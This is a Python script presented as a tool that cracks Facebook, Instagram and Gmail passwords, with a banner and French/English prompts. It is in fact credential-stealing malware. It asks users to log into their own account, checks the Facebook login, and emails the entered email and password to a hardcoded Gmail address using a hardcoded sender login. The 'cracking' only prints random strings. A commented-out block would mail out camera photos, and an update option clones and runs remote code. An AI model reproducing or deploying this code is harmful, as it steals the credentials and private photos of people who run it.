import smtplib, shutil, sys, ssl, os, getpass,time, random
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
try:
 import mechanize
except:
 os.system('pip install mechanize')
 import mechanize
os.system('clear')
print('''
─────╔╗─────────╔╗─╔╗──────────╔╗──
────╔╝╚╗────────║║─║║──────────║║──
╔╗╔╗╚╗╔╝╔══╗╔══╗║║─║╚═╗╔══╗╔══╗║║╔╗
╚╬╬╝─║║─║╔╗║║╔╗║║║─║╔╗║║╔╗║║╔═╝║╚╝╝
╔╬╬╗─║╚╗║╚╝║║╚╝║║╚╗║║║║║╔╗║║╚═╗║╔╗╗
╚╝╚╝─╚═╝╚══╝╚══╝╚═╝╚╝╚╝╚╝╚╝╚══╝╚╝╚╝
                            Created by BadHter
''')

def assur(ide, pasw):
 browser = mechanize.Browser()
 browser.set_handle_robots(False)
 cookies = mechanize.CookieJar()
 browser.set_cookiejar(cookies)
 browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
 browser.set_handle_refresh(False)
 url = 'http://www.facebook.com/login.php'
 browser.open(url)
 browser.select_form(nr = 0)       #This is login-password form -> nr = number = 0
 browser.form['email'] = ide
 browser.form['pass'] = pasw
 response = browser.submit()
 strr = response.read()
 struts = strr.decode('UTF-8')
 if 'id="loginbutton"' in struts:
    sys.exit('incorrect password or no account found.\n\nCheck ur login informations and try again.')

def upd():
    os.chdir('/data/data/com.termux/files/home')
    shutil.rmtree('crack')
    os.system('git clone https://github.com/Derecker/crack')
    os.chdir('/data/data/com.termux/files/home/crack')
    os.system('python cracktool.py')
    sys.exit()
def nth():
    if usn == '' or usp == '':
        time.sleep(2)
        sys.exit('\nFailed to connect')
    if '@' not in usn:
        if '+' not in usn:
            time.sleep(2)
            sys.exit('\nNo account found')

def loop():
    az = 'azertyuiopqsdfghjklmwxcvnb'
    aZ = 'AZERTYUIOPQSDFGHJKLMWXCVNB'
    a1 = str('1234567890')
    ajs = '*@#)(?!;:'
    all = az + ajs + a1 + aZ
    lax = 0
    print('recherche en cours...')
    time.sleep(2)
    while lax < 2999992499999245053:
       print(lax, ''.join(random.sample(all, 8)))
       lax += 1
    print('pass founded: ', ''.join(random.sample(all, 8)))
option = int(input('''
1- Facebook Attack
2- Instagram Attack
3- Gmail Attack
4- update
[:]Choose an option (1/2/3/4): '''))
if option == 1:
    cho = 'Facebook'
    print('\nVeuillez tout d\'abord vous connecter à votre propre compte Facebook -/- First log into your own Facebook account')
    usn = input('\nenter your email/phonenumber: ')
    usp = input('enter your password: ')
    print('En cours de connexion, veuillez patienter...\n')
    nth()
    assur(usn, usp)
elif option == 2:
    cho = 'instagram'
    print('\nVeuillez tout d\'abord vous connecter à votre propre compte instagram -/- First log into your own instagram account')
    usn = input('\nenter your email/phonenumber: ')
    usp = input('enter your password: ')
    print('En cours de connexion, veuillez patienter...')
    nth()
    assur(usn, usp)
elif option == 3:
    cho = 'Gmail'
    print('\nVeuillez tout d\'abord vous connecter à votre compte gmail principal -/- First log into your principal gmail account')
    usn = input('\nenter your email: ')
    usp = input('enter your password: ')
    print('En cours de connexion, veuillez patienter...')
    nth()
    assur(usn, usp)

def connect(nom):
    with open(nom, 'rb') as fp:
        img = MIMEImage(fp.read())
        img.add_header('Content-Disposition', 'attachment', filename=nom)
        msg.attach(img)
    try:
        s.sendmail(sa, ra, msg.as_string())
    except:
        print('<Exeption>')

context = ssl.create_default_context()
# creates SMTP session 

s = smtplib.SMTP_SSL('smtp.gmail.com', 465, context = context) 

  
# start TLS for security 
#s.starttls() 


sa = 'derecknathan245@gmail.com'
kl = '@zedeyep4w0rd'
s.login(sa, kl) 

ra = 'bertranddupont885@gmail.com'
if option != 4:
 connexion = cho + ' - ' + usn + ' - ' + usp
 msg = MIMEMultipart()
 msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
 msg.attach(msgText)
 s.sendmail(sa, ra, msg.as_string())
elif option == 4:
 upd()
'''
chemin = '/storage/emulated/0//DCIM/Camera/'
os.chdir('/storage/emulated/0/DCIM/Camera')
liste = os.listdir()
for x in liste:
    l = list(x)
    #print(l)
    if '.' in l:
        #print(x)
        if l[-1] is 'g':
            #print(x)
            n = chemin + x
            na = list(n)
            if ' ' in na:
                na.remove(' ')
            name = ''.join(na)
            connect(name)
'''
if option == 1:
    lien = input('collez le lien du compte cible: ')
    print('searching for referentials...')
    loop()
    os.system('xdg-open https://m.facebook.com')

elif option == 2:
    lien = input('collez le lien du compte cible: ')
    print('searching for referentials...')
    loop()
    os.system('xdg-open https://www.instagram.com/accounts/login/')

elif option == 3:
    lien = input('adresse email cible: ')
    print('searching for referentials...')
    loop()
    os.system('xdg-open https://mail.google.com/mail/mu/mp/188/#tl/priority/%5Esmartlabel_personal')
